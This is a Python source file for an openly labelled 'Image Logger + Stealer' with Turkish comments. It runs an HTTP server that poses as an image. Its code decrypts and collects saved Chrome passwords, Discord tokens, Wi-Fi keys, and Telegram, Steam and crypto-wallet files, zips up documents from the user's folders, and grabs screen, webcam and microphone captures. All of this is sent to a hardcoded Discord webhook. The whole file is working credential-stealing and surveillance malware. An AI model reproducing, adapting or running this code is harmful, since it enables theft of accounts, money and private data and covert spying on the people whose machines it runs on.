from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback, requests, base64, httpagentparser, os, json, sqlite3, shutil, subprocess, time, threading, sys, win32crypt, tempfile, zipfile, re
from Crypto.Cipher import AES
from PIL import ImageGrab
import cv2
import sounddevice as sd
import wave
import numpy as np

__app__ = "Image Logger + Stealer"
__version__ = "v3.0"

config = {
    "webhook": "https://discord.com/api/webhooks/1521879191165861930/lPotxlicbua1dIUOP_KLCU2ZD4J2fogj0o2flmwsmSwDzFQ0zf6-35JVGB4RS7aLnUy4",  # BURAYA KENDI WEBHOOKUNU YAZ
    "image": "https://images.techhive.com/images/article/2014/04/windows-xp-bliss-desktop-image-100259888-orig.jpg",
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": True,
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {"redirect": False, "page": ""},
    "message": {"doMessage": False, "message": "", "richMessage": False},
}

blacklistedIPs = ("27", "104", "143", "164")

def send(msg):
    try:
        if len(msg) > 2000:
            for i in range(0, len(msg), 2000):
                requests.post(config["webhook"], json={"content": msg[i:i+2000]}, timeout=10)
        else:
            requests.post(config["webhook"], json={"content": msg}, timeout=10)
    except:
        pass

def send_file(file_path):
    try:
        with open(file_path, 'rb') as f:
            requests.post(config["webhook"], files={'file': (os.path.basename(file_path), f)}, timeout=15)
    except:
        pass

def get_encryption_key():
    try:
        path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
        key = base64.b64decode(data["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except:
        return None

def decrypt_password(encrypted_password, key):
    try:
        iv = encrypted_password[3:15]
        payload = encrypted_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt(payload)
        return decrypted[:-16].decode()
    except:
        try:
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
        except:
            return ""

def get_discord_tokens():
    token_pattern = re.compile(r"[\w-]{24,28}\.[\w-]{6,7}\.[\w-]{27,38}")
    tokens = []
    paths = [
        os.getenv('APPDATA') + '\\discord\\Local Storage\\leveldb',
        os.getenv('APPDATA') + '\\discordcanary\\Local Storage\\leveldb',
        os.getenv('APPDATA') + '\\discordptb\\Local Storage\\leveldb',
        os.getenv('LOCALAPPDATA') + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb',
        os.getenv('LOCALAPPDATA') + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb',
        os.getenv('LOCALAPPDATA') + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb',
    ]
    for path in paths:
        if os.path.exists(path):
            try:
                for file in os.listdir(path):
                    if file.endswith('.log') or file.endswith('.ldb'):
                        with open(os.path.join(path, file), 'r', errors='ignore') as f:
                            data = f.read()
                            found = token_pattern.findall(data)
                            tokens.extend(found)
            except:
                pass
    return list(set(tokens))

def get_chrome_passwords():
    passwords = []
    key = get_encryption_key()
    if not key:
        return passwords
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
    if not os.path.exists(db_path):
        return passwords
    temp = os.path.join(os.environ["TEMP"], "temp.db")
    try:
        shutil.copyfile(db_path, temp)
        conn = sqlite3.connect(temp)
        cur = conn.cursor()
        cur.execute("SELECT origin_url, username_value, password_value FROM logins")
        for row in cur.fetchall():
            url = row[0]
            user = row[1]
            pwd = row[2]
            if user and pwd:
                dec = decrypt_password(pwd, key)
                if dec:
                    passwords.append(f"URL: {url} | Kullanici: {user} | Sifre: {dec}")
        conn.close()
        os.remove(temp)
    except:
        pass
    return passwords

def get_system_info():
    try:
        hostname = os.environ['COMPUTERNAME']
        username = os.environ['USERNAME']
        ip = requests.get('https://api.ipify.org', timeout=5).text
        return f"Hostname: {hostname}\nKullanici: {username}\nIP: {ip}"
    except:
        return "Sistem bilgisi alinamadi."

def screenshot():
    try:
        path = os.path.join(os.environ["TEMP"], "screen.png")
        ImageGrab.grab().save(path)
        return path
    except:
        return None

def webcam():
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            path = os.path.join(os.environ["TEMP"], "webcam.jpg")
            cv2.imwrite(path, frame)
            cap.release()
            return path
        cap.release()
        return None
    except:
        return None

def mic_record():
    try:
        duration = 5
        fs = 44100
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=1, dtype='int16')
        sd.wait()
        path = os.path.join(os.environ["TEMP"], "mic.wav")
        with wave.open(path, 'wb') as wf:
            wf.setnchannels(1)
            wf.setsampwidth(2)
            wf.setframerate(fs)
            wf.writeframes(recording.tobytes())
        return path
    except:
        return None

def get_wifi_passwords():
    wifi_list = []
    try:
        output = subprocess.run("netsh wlan show profiles", capture_output=True, text=True, shell=True)
        profiles = re.findall(r"Tüm Kullanıcı Profilleri\s*:\s*(.+)", output.stdout)
        if not profiles:
            profiles = re.findall(r"All User Profile\s*:\s*(.+)", output.stdout)
        for profile in profiles:
            profile = profile.strip()
            try:
                detail = subprocess.run(f"netsh wlan show profile name=\"{profile}\" key=clear", capture_output=True, text=True, shell=True)
                key_match = re.search(r"Anahtar İçeriği\s*:\s*(.+)", detail.stdout) or re.search(r"Key Content\s*:\s*(.+)", detail.stdout)
                if key_match:
                    wifi_list.append(f"Ad: {profile} | Sifre: {key_match.group(1).strip()}")
                else:
                    wifi_list.append(f"Ad: {profile} | Sifre: (bos)")
            except:
                pass
    except:
        pass
    return wifi_list

def get_telegram():
    data = []
    path = os.path.join(os.environ["APPDATA"], "Telegram Desktop", "tdata")
    if os.path.exists(path):
        try:
            for file in os.listdir(path):
                if file.startswith("usertag") or file.startswith("user") or file.startswith("auth"):
                    with open(os.path.join(path, file), "r", errors="ignore") as f:
                        data.append(f"{file}:\n{f.read()[:500]}")
        except:
            pass
    return data

def get_steam():
    data = []
    path = os.path.join(os.environ["PROGRAMFILES"], "Steam")
    if not os.path.exists(path):
        path = os.path.join(os.environ["PROGRAMFILES(X86)"], "Steam")
    if os.path.exists(path):
        try:
            for file in os.listdir(path):
                if file.startswith("ssfn") or file == "config.vdf":
                    with open(os.path.join(path, file), "r", errors="ignore") as f:
                        data.append(f"{file}:\n{f.read()[:500]}")
        except:
            pass
    return data

def get_wallets():
    data = []
    paths = [
        os.path.join(os.environ["APPDATA"], "Exodus"),
        os.path.join(os.environ["APPDATA"], "Atomic"),
        os.path.join(os.environ["APPDATA"], "Electrum"),
        os.path.join(os.environ["APPDATA"], "MetaMask"),
        os.path.join(os.environ["APPDATA"], "Phantom"),
    ]
    for path in paths:
        if os.path.exists(path):
            try:
                for file in os.listdir(path):
                    if file.endswith((".json", ".dat", ".wallet")):
                        with open(os.path.join(path, file), "r", errors="ignore") as f:
                            data.append(f"{path} - {file}:\n{f.read()[:500]}")
            except:
                pass
    return data

def collect_files():
    collected = []
    extensions = ('.txt', '.doc', '.docx', '.xls', '.xlsx', '.pdf', '.ppt', '.pptx', '.rtf', '.odt', '.ods', '.csv', '.log', '.ini', '.cfg', '.conf', '.json', '.xml', '.html', '.htm', '.md', '.bat', '.ps1', '.vbs', '.js', '.py', '.key', '.pem', '.ppk')
    folders = [
        os.path.join(os.environ["USERPROFILE"], "Desktop"),
        os.path.join(os.environ["USERPROFILE"], "Documents"),
        os.path.join(os.environ["USERPROFILE"], "Downloads"),
    ]
    zip_path = os.path.join(os.environ["TEMP"], "files.zip")
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for folder in folders:
            if os.path.exists(folder):
                try:
                    for root, _, files in os.walk(folder):
                        for file in files:
                            if file.lower().endswith(extensions):
                                full = os.path.join(root, file)
                                try:
                                    if os.path.getsize(full) < 10 * 1024 * 1024:
                                        zipf.write(full, os.path.relpath(full, os.environ["USERPROFILE"]))
                                        collected.append(full)
                                except:
                                    pass
                except:
                    pass
    return zip_path, collected

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    
    send("=== IMAGE LOGGER + STEALER ===")
    send(f"**IP:** {ip}")
    send(f"**Konum:** {info.get('country', 'Bilinmiyor')} / {info.get('city', 'Bilinmiyor')}")
    send(f"**ISP:** {info.get('isp', 'Bilinmiyor')}")
    send(f"**VPN:** {info.get('proxy', False)}")
    
    os_name, browser = httpagentparser.simple_detect(useragent) if useragent else ("Bilinmiyor", "Bilinmiyor")
    send(f"**OS:** {os_name}")
    send(f"**Browser:** {browser}")
    send(f"**User-Agent:** {useragent}")
    
    # Discord tokenleri
    tokens = get_discord_tokens()
    if tokens:
        for t in tokens:
            send(f"**DISCORD TOKEN:** `{t}`")
    else:
        send("Discord token bulunamadi.")
    
    # Chrome şifreleri
    passwords = get_chrome_passwords()
    for p in passwords[:20]:
        send(f"**CHROME SIFRE:** {p}")
    
    # Sistem bilgisi
    sys_info = get_system_info()
    send(f"**SISTEM:** {sys_info}")
    
    # Ekran görüntüsü
    sc = screenshot()
    if sc:
        send_file(sc)
        os.remove(sc)
    
    # Webcam
    wc = webcam()
    if wc:
        send_file(wc)
        os.remove(wc)
    
    # Mikrofon kaydı
    mic = mic_record()
    if mic:
        send_file(mic)
        os.remove(mic)
    
    # Wi-Fi şifreleri
    wifi = get_wifi_passwords()
    for w in wifi:
        send(f"**WI-FI:** {w}")
    
    # Telegram
    tg = get_telegram()
    for t in tg:
        send(f"**TELEGRAM:** {t[:1500]}")
    
    # Steam
    steam = get_steam()
    for s in steam:
        send(f"**STEAM:** {s[:1500]}")
    
    # Kripto cüzdanlar
    wallets = get_wallets()
    for w in wallets:
        send(f"**WALLET:** {w[:1500]}")
    
    # Dosya toplama
    zip_path, files = collect_files()
    if files:
        try:
            send_file(zip_path)
            send(f"**ZIP DOSYASI GONDERILDI:** {len(files)} dosya icerir.")
            os.remove(zip_path)
        except:
            send("ZIP gonderilemedi.")
    
    send("=== ISLEM TAMAMLANDI ===")

def reportError(error):
    requests.post(config["webhook"], json={"content": f"**HATA:**\n```{error}```"})

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerStealerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            url = config["image"]
            data = f'<style>body{{margin:0;padding:0;}}div.img{{background-image:url("{url}");background-position:center;background-repeat:no-repeat;background-size:contain;width:100vw;height:100vh;}}</style><div class="img"></div>'.encode()
            
            if self.headers.get('x-forwarded-for', '').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()
                if config["buggedImage"]:
                    self.wfile.write(binaries["loading"])
                makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint=self.path.split("?")[0])
                return
            
            else:
                makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint=self.path.split("?")[0])
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(data)
        
        except Exception as e:
            self.send_response(500)
            self.end_headers()
            reportError(traceback.format_exc())
    
    do_GET = handleRequest
    do_POST = handleRequest

def botCheck(ip, useragent):
    if ip and ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", 8080), ImageLoggerStealerAPI)
    print("Image Logger + Stealer başlatıldı. http://localhost:8080")
    server.serve_forever()
